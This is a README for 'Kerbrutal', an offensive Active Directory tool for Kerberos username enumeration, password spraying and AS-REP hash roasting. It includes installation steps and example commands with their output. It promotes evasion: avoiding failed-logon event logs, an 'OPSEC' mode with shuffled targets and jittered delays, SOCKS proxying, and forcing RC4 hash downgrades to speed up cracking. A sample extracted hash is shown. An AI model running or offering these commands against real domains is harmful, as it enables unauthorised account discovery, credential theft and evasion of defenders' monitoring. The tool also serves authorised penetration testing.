# Kerbrutal

Kerbrutal is a fast and stealthy Active Directory Kerberos enumeration and brute-force utility. It represents a significant modernization of the original Kerbrute framework by Ronnie Flathers (@ropnop).

This tool performs Kerberos Pre-Authentication to validate usernames, spray passwords, and extract AS-REP roastable hashes without triggering standard Windows Event ID 4625 (Failed Logon) logs for user enumeration.

## Key Features

### Username Mutation Engine (`--mutate`)
Feed a raw list of employee names into the `mutate` command to dynamically generate standard corporate AD naming permutations.
- **`standard` (Tier 1)**: Generates common formats (`jsmith`, `john.smith`, `johnsmith`, etc.) plus integers up to 4 for collision resolution.
- **`extended` (Tier 2)**: Adds additional variations including underscores and reversed name logic.
- **`full` (Tier 3)**: Adds formats parsing middle initials and splitting hyphenated last names into multiple sub-targets.

**Example execution**:
```text
$ kerbrutal mutate --names employees.txt --level full -o generated.txt

    __             __               __        __
   / /_____  _____/ /_  _______  __/ /_____ _/ /
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ __ '/ / 
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/ /_/ / /  
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\__,_/_/   

Version: 1.0 - @abdelaaziz0 (Modernization of Kerbrute by Ronnie Flathers @ropnop)

2026/03/27 04:39:20 >  Mutation complete: Generated 114 usernames from employees.txt (level: full)
```

### Stealth OPSEC Mode (`--opsec`)
Stay under radar thresholds by enabling `--opsec`. Under the hood, this flag triggers two protective features:
1. **Target Shuffling**: Before any network traffic is sent, the entire loaded wordlist is randomized in memory using a Fisher-Yates shuffle.
2. **Jitter Generation**: Whenever an explicit `--delay` is configured, a secure thread-safe pseudo-RNG modifies the base delay uniformly by a random margin of **±30%**.

### Adaptive Lockout Backoff (Auto-Enabled)
Instead of continuing to spray indiscriminately when defensive mechanisms trigger, Kerbrutal mathematically scales connection delays to prevent domain-wide lockouts:
- When a `KDC_ERR_CLIENT_REVOKED` (lockout) occurs, a global penalty interval is spawned starting at **1000ms**.
- If lockouts continue, the penalty **doubles** per failure until it hits a cap of **30,000ms**.
- After **10 consecutive successes**, the penalty is recursively halved until cleared completely.

### AS-REP Roasting & RC4 Downgrading
Automatically dump crackable Hashcat AES-256 (Type 18) hashes for accounts lacking pre-authentication properties. Modern enterprise architectures prioritize AES over legacy RC4. To force the extraction of weaker RC4 (`$krb5asrep$23$`) hashes for significantly faster offline cracking, supply the `--downgrade` flag.

### Progress and Pipeline Integrations (`--json`)
Progress bars and application warning messages are rigidly diverted to `os.Stderr` when the `--json` flag is provided. This guarantees that `stdout` pipelines cleanly emit structure `jsonl` strings representing `valid_username`, `lockout`, and `asrep_roastable` events. Resume aborted campaigns natively with `-R progress.txt`.

## Installation

Ensure you have Go installed (v1.20+), then compile the binary:

```bash
git clone https://github.com/abdelaaziz0/kerbrutal.git
cd kerbrutal
go mod tidy
go build -o kerbrutal .
sudo mv kerbrutal /usr/local/bin/
```

## Usage

**User Enumeration with OPSEC and valid result tracking**
```text
$ kerbrutal userenum -d DOMAIN.LOCAL --dc 10.10.10.10 --opsec -V valid_users.txt generated.txt

    __             __               __        __
   / /_____  _____/ /_  _______  __/ /_____ _/ /
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ __ '/ / 
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/ /_/ / /  
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\__,_/_/   

Version: 1.0 - @abdelaaziz0 (Modernization of Kerbrute by Ronnie Flathers @ropnop)

2026/03/27 04:39:25 >  Saving valid results to valid_users.txt
2026/03/27 04:39:25 >  OPSEC mode enabled: shuffled wordlists + jittered delays
2026/03/27 04:39:25 >  Using KDC(s):
2026/03/27 04:39:25 >   10.10.10.10:88

2026/03/27 04:39:25 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@DOMAIN.LOCAL:751cba349...[SNIP]...4ae6e1f8c5be4667f533c

2026/03/27 04:39:26 >  Done! Tested 114 usernames (1 valid) in 0.632 seconds
[Progress] 114/114 (100.0%) — 1 valid
```

**Advanced Proxied Stealth Sweep**
```bash
kerbrutal userenum -d domain.com --dc 10.0.0.1 --proxy socks5://127.0.0.1:1080 --opsec --downgrade --hash-file asreps.txt -V valid.txt usernames.txt
```

## License and Credits
Kerbrutal is licensed under the MIT License.
Major enhancement tracking and architecture overhaul by [@abdelaaziz0]. Built atop the foundational Kerbrute engine authored by Ronnie Flathers (@ropnop). 
